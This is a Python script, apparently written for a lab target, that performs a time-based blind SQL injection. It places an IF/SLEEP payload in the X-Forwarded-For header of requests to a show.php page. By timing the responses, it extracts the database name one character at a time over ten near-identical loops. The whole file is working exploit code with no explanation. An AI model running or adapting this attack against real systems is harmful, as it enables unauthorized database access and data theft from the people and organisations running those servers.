#!/usr/bin/env python
#Author: Anakein
#Date: 02/07/2019

import requests
import string

time = 8
def letBlind_db():
    print("Getting database...")
    foundChars_D = []
    for i in string.lowercase + string.punctuation + string.digits:
        db1_chars = ''.join(foundChars_D)
        r=requests.get("http://172.16.187.151/show.php?id=1", headers={"X-Forwarded-for":"1' or IF(MID(database(),1,1) = '"+i+"', SLEEP(2), 0) and '1'='1"}).elapsed.total_seconds()
        timebased = int(r)
        if timebased == time:
            foundChars_D.append(i) 
    db = ''.join(foundChars_D)
    print(" [+] 0: " + db)

    for i in string.lowercase + string.punctuation + string.digits:
        db1_chars = ''.join(foundChars_D)
        r=requests.get("http://172.16.187.151/show.php?id=1", headers={"X-Forwarded-for":"1' or IF(MID(database(),1,2) = '"+db+i+"', SLEEP(2), 0) and '1'='1"}).elapsed.total_seconds()
        timebased = int(r)
        if timebased == time:
            foundChars_D.append(i) 
    db2 = ''.join(foundChars_D)
    print(" [+] 2: " + db2)

    for i in string.lowercase + string.punctuation + string.digits:
        db1_chars = ''.join(foundChars_D)
        r=requests.get("http://172.16.187.151/show.php?id=1", headers={"X-Forwarded-for":"1' or IF(MID(database(),1,3) = '"+db2+i+"', SLEEP(2), 0) and '1'='1"}).elapsed.total_seconds()
        timebased = int(r)
        if timebased == time:
            foundChars_D.append(i)
    db3 = ''.join(foundChars_D)
    print(" [+] 3: " + db3)

    for i in string.lowercase + string.punctuation + string.digits:
        db1_chars = ''.join(foundChars_D)
        r=requests.get("http://172.16.187.151/show.php?id=1", headers={"X-Forwarded-for":"1' or IF(MID(database(),1,4) = '"+db3+i+"', SLEEP(2), 0) and '1'='1"}).elapsed.total_seconds()
        timebased = int(r)
        if timebased == time:
            foundChars_D.append(i)
    db4 = ''.join(foundChars_D)
    print(" [+] 4: " + db4)

    for i in string.lowercase + string.punctuation + string.digits:
        db1_chars = ''.join(foundChars_D)
        r=requests.get("http://172.16.187.151/show.php?id=1", headers={"X-Forwarded-for":"1' or IF(MID(database(),1,5) = '"+db4+i+"', SLEEP(2), 0) and '1'='1"}).elapsed.total_seconds()
        timebased = int(r)
        if timebased == time:
            foundChars_D.append(i)
    db5 = ''.join(foundChars_D)
    print(" [+] 5: " + db5)

    for i in string.lowercase + string.punctuation + string.digits:
        db1_chars = ''.join(foundChars_D)
        r=requests.get("http://172.16.187.151/show.php?id=1", headers={"X-Forwarded-for":"1' or IF(MID(database(),1,6) = '"+db5+i+"', SLEEP(2), 0) and '1'='1"}).elapsed.total_seconds()
        timebased = int(r)
        if timebased == time:
            foundChars_D.append(i)
    db6 = ''.join(foundChars_D)
    print(" [+] 6: " + db6)

    for i in string.lowercase + string.punctuation + string.digits:
        db1_chars = ''.join(foundChars_D)
        r=requests.get("http://172.16.187.151/show.php?id=1", headers={"X-Forwarded-for":"1' or IF(MID(database(),1,7) = '"+db6+i+"', SLEEP(2), 0) and '1'='1"}).elapsed.total_seconds()
        timebased = int(r)
        if timebased == time:
            foundChars_D.append(i)
    db7 = ''.join(foundChars_D)
    print(" [+] 7: " + db7)

    for i in string.lowercase + string.punctuation + string.digits:
        db1_chars = ''.join(foundChars_D)
        r=requests.get("http://172.16.187.151/show.php?id=1", headers={"X-Forwarded-for":"1' or IF(MID(database(),1,8) = '"+db7+i+"', SLEEP(2), 0) and '1'='1"}).elapsed.total_seconds()
        timebased = int(r)
        if timebased == time:
            foundChars_D.append(i)
    db8 = ''.join(foundChars_D)
    print(" [+] 8: " + db8)

    for i in string.lowercase + string.punctuation + string.digits:
        db1_chars = ''.join(foundChars_D)
        r=requests.get("http://172.16.187.151/show.php?id=1", headers={"X-Forwarded-for":"1' or IF(MID(database(),1,9) = '"+db8+i+"', SLEEP(2), 0) and '1'='1"}).elapsed.total_seconds()
        timebased = int(r)
        if timebased == time:
            foundChars_D.append(i)
    db9 = ''.join(foundChars_D)
    print(" [+] 9: " + db9)

    for i in string.lowercase + string.punctuation + string.digits:
        db1_chars = ''.join(foundChars_D)
        r=requests.get("http://172.16.187.151/show.php?id=1", headers={"X-Forwarded-for":"1' or IF(MID(database(),1,10) = '"+db9+i+"', SLEEP(2), 0) and '1'='1"}).elapsed.total_seconds()
        timebased = int(r)
        if timebased == time:
            foundChars_D.append(i)
    db10 = ''.join(foundChars_D)
    print(" [+] 10: " + db10)
    
letBlind_db()
